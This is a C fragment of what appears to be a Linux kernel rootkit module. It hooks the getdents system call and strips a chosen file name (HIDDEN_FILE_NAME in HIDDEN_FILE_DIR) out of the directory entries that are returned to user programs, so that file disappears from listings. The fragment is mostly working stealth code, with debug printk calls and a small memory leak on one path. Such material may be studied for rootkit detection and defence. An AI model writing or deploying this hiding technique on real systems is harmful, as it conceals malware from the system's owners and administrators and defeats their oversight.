struct linux_dirent {
           long           d_ino;
           off_t          d_off;
           unsigned short d_reclen;
           char           d_name[];
       };

asmlinkage int (*original_getdents) (unsigned int fd, struct linux_dirent* dirp, unsigned int count);


static int remove_dirent_entry(int bytes_read, struct linux_dirent* dirp, unsigned int count, char* name_to_remove){
    int bpos = 0;
    int rem = 0;
    char file_name[NAME_MAX] = {0};
    char* tempbuf = NULL;
    int nread = bytes_read;
    struct linux_dirent *d = NULL;
    struct linux_dirent copied;

    while (bpos < nread){
            d = (struct linux_dirent *) ((char*)dirp + bpos);
            strncpy_from_user(file_name, d->d_name, NAME_MAX);

            copy_from_user(&copied, d, sizeof(struct linux_dirent));
            printk("get file: %s", file_name);
            if (strcmp(file_name, name_to_remove) == 0){
               
                tempbuf = kmalloc(sizeof(char) * count, GFP_KERNEL);
                if (tempbuf == NULL){
                    return -1;
                }
                // bpos currently points to the beginning of the entry we wish to remove,
                // (bpos + d_reclen) points to the start of the next entry
                // we copy the entire buffer from (bpos + d_reclen) to its end, and moves this section to bpos,
                // by doing that we override the current entry with the next entry, and makes the buffer shorter by d_reclen bytes.
                rem = count - (bpos + copied.d_reclen);     // the remaining bytes between next entry to the end of the buffer
                if (copy_from_user(tempbuf, dirp, count) != 0){
                    kfree(tempbuf);
                    return -1;
                }
                memmove(tempbuf + bpos ,tempbuf + bpos + copied.d_reclen, rem);
                if (copy_to_user(dirp, tempbuf, count) != 0){
                    kfree(tempbuf);
                    return -1;
                }
                
                kfree(tempbuf);
                nread -= copied.d_reclen;
                return nread;   
            }
            bpos += copied.d_reclen;
    }
    return nread;
}

asmlinkage int sys_getdents_hook(unsigned int fd, struct linux_dirent* dirp, unsigned int count)
{
    int res;
    int nread;

    struct file * f = NULL;
    struct path files_path;
    char *cwd;
    char *path_buf;

    nread = original_getdents(fd, dirp, count);
    if (nread < 0){
        return nread;
    }

    printk("fd is %d", fd);
    f = fcheck(fd);
    if (f != NULL){
        path_buf = (char *)kmalloc(PATH_MAX*sizeof(char), GFP_KERNEL);
        if (path_buf == NULL){
            printk("failed to set buf");
            return nread;
        }
    
        files_path = f->f_path;
        cwd = d_path(&files_path,path_buf,PATH_MAX*sizeof(char));
        printk(KERN_ALERT "Open file with fd %d  %s", fd,cwd);
        if (strcmp(cwd, HIDDEN_FILE_DIR) == 0){
            kfree(path_buf);
            res = remove_dirent_entry(nread, dirp, count, HIDDEN_FILE_NAME);
            if (res < 0){
                return nread;
            }
            return res;
        }
        kfree(path_buf);
    }
    return nread;
}
